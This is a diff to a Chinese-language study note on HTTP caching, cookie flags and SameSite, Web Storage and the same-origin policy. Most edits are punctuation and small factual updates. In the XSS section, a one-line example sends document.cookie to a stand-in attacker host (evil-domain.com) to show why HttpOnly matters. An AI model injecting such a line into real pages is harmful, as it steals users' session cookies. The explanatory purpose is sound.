@@ -210,13 +210,13 @@ Last-Modified 是一个响应头部，其中包含服务端认定的资源做出
 
 ### 缓存控制
 
-1. 请求一个资源时首先会检查强缓存 Cache-Control 的 max-age 或 s-maxage，若未过期则直接使用缓存响应请求，若过期则跳至 3 检查协商缓存，若无 max-age 或 s-maxage 值，则至 2 检查强缓存 Expires；
+1. 请求一个资源时首先会检查强缓存 Cache-Control 的 max-age 或 s-maxage。若未过期则直接使用缓存响应请求；若过期则跳至 3 检查协商缓存；若无 max-age 或 s-maxage 值，则至 2 检查强缓存 Expires；
 
-2. 若检查 Expires 未过期则直接使用缓存响应请求，若过期或不存在 Expires 头则跳至 3 检查协商缓存；
+2. 若检查 Expires 未过期则直接使用缓存响应请求；若过期或不存在 Expires 头则跳至 3 检查协商缓存；
 
-3. 若 ETag 存在，则将 ETag 值带入 If-None-Match 头中请求服务器判断资源是否更新，若未更新，返回不带 body 的 304 Not Modified 响应，直接使用缓存响应请求，若资源已更新，正常返回状态码为 200 的资源；若 ETag 不存在，跳至 4 检查协商缓存；
+3. 若 ETag 存在，则将 ETag 值带入 If-None-Match 头中请求服务器判断资源是否更新。若未更新，返回不带 body 的 304 Not Modified 响应，直接使用缓存响应请求；若资源已更新，正常返回状态码为 200 的资源；若 ETag 不存在，跳至 4 检查协商缓存；
 
-4. 若 Last-Modified 存在，将 Last-Modified 值带入 If-Modified-Since 头中请求服务器判断资源是否更新，若未更新，返回不带 body 的 304 Not Modified 响应，直接使用缓存响应请求，若资源已更新，正常返回状态码为 200 的资源，若 Last-Modified 不存在，则当作没有缓存，直接正常请求资源
+4. 若 Last-Modified 存在，将 Last-Modified 值带入 If-Modified-Since 头中请求服务器判断资源是否更新。若未更新，返回不带 body 的 304 Not Modified 响应，直接使用缓存响应请求；若资源已更新，正常返回状态码为 200 的资源；若 Last-Modified 不存在，则当作没有缓存，直接正常请求资源
 
 对于含有特定头信息的请求，会去计算缓存寿命。比如 Cache-Control: max-age=N 或 s-maxage=N 的头，相应缓存的寿命就是 N。通常情况下，对于不含这个属性的请求则会去查看是否包含 Expires 属性，通过比较 Expires 的值和头里面 Date 属性值来判断缓存是否还有效，若 Date 属性不存在，则使用本地时间。如果 max-age、s-maxage 和 expires 属性都没有，就会找头部的 Last-Modified 信息。若有，缓存的寿命就等于头里面 Date 的值减去 Last-Modified 的值除以 10。
 
@@ -313,7 +313,7 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 
 #### Cookie 的 Secure 和 HttpOnly 标记
 
-标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http）无法使用 Cookie 的 Secure 标记。
+标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http）无法使用 Cookie 的 Secure 标记。为了方便开发环境使用，如果是 localhost，Secure 标记不再强制要求 https 协议。
 
 为避免跨域脚本（XSS）攻击，通过 JavaScript 的 document.cookie API 无法访问带有 HttpOnly 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。
 
@@ -347,7 +347,7 @@ SameSite 是 Cookie 相对较新的一个字段，所有主流浏览器都已经
 
 SameSite 可以取下面三种值：
 
-1. None: 浏览器会在同站请求、跨站请求下继续发送 Cookie，不区分大小写
+1. None: 浏览器会在同站请求、跨站请求下继续发送 Cookie，不区分大小写；最新标准下 None 不再是默认值，且设置为 None 要求必需使用 Secure 标记，即只能在 Https 环境下使用
 
 2. Strict：浏览器将只发送相同站点请求的 cookie（即当前网页 URL 与请求目标 URL 完全一致）。如果请求来自与当前 URL 不同的 URL，则不发送标记为 Strict 属性的 Cookie
 
@@ -362,8 +362,8 @@ SameSite 可以取下面三种值：
 通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。
 
 ```javascript
-document.cookie = 'yummy_cookie=choco';
-document.cookie = 'tasty_cookie=strawberry';
+document.cookie = "yummy_cookie=choco";
+document.cookie = "tasty_cookie=strawberry";
 console.log(document.cookie);
 // "yummy_cookie=choco; tasty_cookie=strawberry"
 ```
@@ -388,7 +388,7 @@ xss 的防范
 
 ```javascript
 new Image().src =
-  'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 HttpOnly 类型的 Cookie 由于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。
@@ -440,13 +440,13 @@ Cookie 的一个极端用例是僵尸 Cookie（或称删不掉的 Cookie），�
 
 ### Cookie 与 Web Storage API 对比
 
-|          | Cookie                                                                 | LocalStorage                                            | SessionStorage                                                                                                                                           |
-| -------- | ---------------------------------------------------------------------- | ------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| 大小     | 4K                                                                     | 5M                                                      | 5M                                                                                                                                                       |
-| 生命周期 | 可设置过期时间，不设置则关闭浏览器后过期                               | 永久保存，直至清除                                      | 关闭页面或浏览器后清除                                                                                                                                   |
-| 作用域   | 宽松同源策略，协议与端口可以不同，且 Cookie 可以被给定域及其子域访问到 | 同源策略，协议、主机、端口一致的页面可共享 LocalStorage | 同源策略+浏览器标签页隔离，同一 Tab 标签页下同源网站才可共享 SessionStorage，即在两个标签页中打开同一个网站，也是各自维护各自的 SessionStorage，不可共享 |
-| 传输     | 加了 with-credential 请求头后，每次请求都会携带 Cookie                 | 不会携带在请求中                                        | 不会携带在请求中                                                                                                                                         |
-| 易用性   | 无 get 与 set 接口，使用麻烦                                           | 原生 API，使用方便                                      | 原生 API，使用方便                                                                                                                                       |
+|          | Cookie                                                                                             | LocalStorage                                                            | SessionStorage                                                                                                                                           |
+| -------- | -------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 大小     | 4K                                                                                                 | 5M                                                                      | 5M                                                                                                                                                       |
+| 生命周期 | 可设置过期时间，不设置则关闭浏览器后过期                                                           | 永久保存，直至清除                                                      | 关闭页面或浏览器后清除                                                                                                                                   |
+| 作用域   | 宽松同源策略，~~协议与端口可以不同，~~新标准要求协议端口一致，但 Cookie 可以被给定域及其子域访问到 | 同源策略，协议、主机、端口一致的页面可共享 LocalStorage（子域不可访问） | 同源策略+浏览器标签页隔离，同一 Tab 标签页下同源网站才可共享 SessionStorage，即在两个标签页中打开同一个网站，也是各自维护各自的 SessionStorage，不可共享 |
+| 传输     | 加了 with-credential 请求头后，每次请求都会携带 Cookie                                             | 不会携带在请求中                                                        | 不会携带在请求中                                                                                                                                         |
+| 易用性   | 无 get 与 set 接口，使用麻烦                                                                       | 原生 API，使用方便                                                      | 原生 API，使用方便                                                                                                                                       |
 
 ## HTTP 跨域资源共享 CORS（Cross-Origin Resource Sharing）
 
@@ -475,6 +475,8 @@ Cookie 的一个极端用例是僵尸 Cookie（或称删不掉的 Cookie），�
 例如：在`http://store.company.com/dir/other.html`文档中的一个脚本执行了更改源的语句`document.domain = "company.com";`，语句执行后，页面将会成功地通过与`http://company.com/dir/page.html`的同源检测（这里假定`http://company.com/dir/page.html`已经将`document.domain`设置为`company.com`，后面会讲原因）。非常重要的是，源的修改只能向自己的父域修改，不可以修改至其他源（如本例中不能修改为`othercompany.com`），当然如果当前域已经是一级域（如`company.com`），则无法修改为父域（`com`），因为父域已经是顶域了，如果可以修改为顶域，就会导致所有 com 顶域都同源的情况。
 
 端口号是由浏览器另行检查的。任何对 document.domain 的赋值操作，包括`document.domain = document.domain` 都会导致端口号被重写为 null。因此`http://company.com:8080`单方面设置`document.domain = "company.com"`还不够，还必需在`http://company.com`（默认端口是 80）中也进行赋值操作`document.domain = "company.com"`，以确保端口号都为 null。前面设置子域的 document.domain 来访问父域时，我们假定父域已修改也是出于这个原因，即使看起来父域的设置多此一举，但隐含的端口号其实不一致（一个为 null，一个为 80），同时设置避免了端口号不同造成的同源判定失败。
+
+> 注意：**这种方法改变源并不影响 Web API 使用的源检查（例如 localStorage、indexedDB、BroadcastChannel、SharedWorker）**，故只有 Cookie 能以此法绕过源检查，但这样做会影响整个网页的安全性，Cookie 本身的 Domain 参数足以使 Cookie 在子域中共享，无需使用这个风险更高的操作。
 
 #### 跨域网络访问
 
@@ -559,7 +561,7 @@ Location
 
 访问存储在浏览器中的数据，如 LocalStorage 和 IndexedDB，是以源进行分隔的。每个源都拥有自己单独的存储空间，一个源中的 JavaScript 脚本不能对属于其它源的数据进行读写操作。
 
-Cookie 使用不同的源定义方式。一个页面可以为本域和父域设置 Cookie，只要父域不是顶域（公共后缀 public suffix）即可。无论使用哪个协议或端口号，浏览器都允许给定的域及其任何子域（sub-domains）访问 Cookie。当你设置 Cookie 时，可以使用 Domain、Path、Secure 和 HttpOnly 标记来限定其可访问性。
+Cookie 使用不同的源定义方式。一个页面可以为本域和父域设置 Cookie，只要父域不是顶域（公共后缀 public suffix）即可。~~无论使用哪个协议或端口号，~~浏览器都允许给定的域及其任何子域（sub-domains）访问 Cookie。当你设置 Cookie 时，可以使用 Domain、Path、Secure 和 HttpOnly 标记来限定其可访问性。
 
 当你读取 Cookie 时，你无法知道它是在哪里被设置的。即使你只使用安全的 https 连接，你看到的任何 Cookie 都有可能是使用不安全的连接进行设置的。
 
